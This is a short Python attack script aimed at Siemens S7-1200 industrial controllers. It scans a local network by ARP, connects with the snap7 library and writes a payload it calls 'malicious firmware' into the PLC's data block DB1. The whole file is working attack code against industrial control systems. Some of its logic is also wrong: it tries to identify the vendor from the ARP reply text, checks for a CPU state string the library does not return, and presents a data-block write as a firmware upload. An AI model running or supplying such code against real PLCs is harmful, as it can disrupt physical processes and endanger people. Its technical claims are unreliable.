import struct
import snap7
from scapy.all import ARP, Ether, srp
import time

# Function to scan the network and find the PLC IP
def find_plc_ip(network_range="192.168.1.1/24"):
    print("[*] Scanning the network for Siemens S7-1200 PLCs...")
    arp_request = ARP(pdst=network_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp_request
    result = srp(packet, timeout=2, verbose=False)[0]
    
    for sent, received in result:
        if "Siemens" in received.show(dump=True):  # Identifying Siemens devices
            print(f"[+] PLC Found at IP: {received.psrc}")
            return received.psrc
    print("[-] No PLC found on the network.")
    return None

# Function to connect to the PLC
def connect_to_plc(ip):
    print(f"[*] Connecting to PLC at {ip}...")
    plc = snap7.client.Client()
    try:
        plc.connect(ip, 0, 1)  # Rack 0, Slot 1 (Default for S7-1200)
        if plc.get_cpu_state() == "RUN":
            print("[+] PLC is running and accessible.")
            return plc
        else:
            print("[-] PLC is not in RUN mode. Exiting...")
            return None
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        return None

# Function to upload malicious firmware (Simulation)
def upload_malicious_firmware(plc):
    print("[*] Attempting to upload malicious firmware...")

    try:
        # Siemens PLC firmware update process is proprietary, but we can simulate writing malicious firmware data.
        # Normally, we'd need access to Siemens TIA Portal for legitimate firmware updates.
        
        firmware_payload = struct.pack(">I", 0xDEADBEEF)  # Sample malicious firmware data
        plc.write_area(snap7.types.Areas.DB, 1, 0, firmware_payload)  # Writing to DB1 (Dangerous)
        
        print("[+] Malicious firmware uploaded successfully!")
    except Exception as e:
        print(f"[-] Firmware upload failed: {e}")

# Main Logic
def main():
    plc_ip = find_plc_ip()
    
    if not plc_ip:
        print("[-] Could not locate PLC. Exiting...")
        return
    
    plc = connect_to_plc(plc_ip)
    
    if plc:
        upload_malicious_firmware(plc)
        plc.disconnect()
        print("[*] Finished execution.")

if __name__ == "__main__":
    main()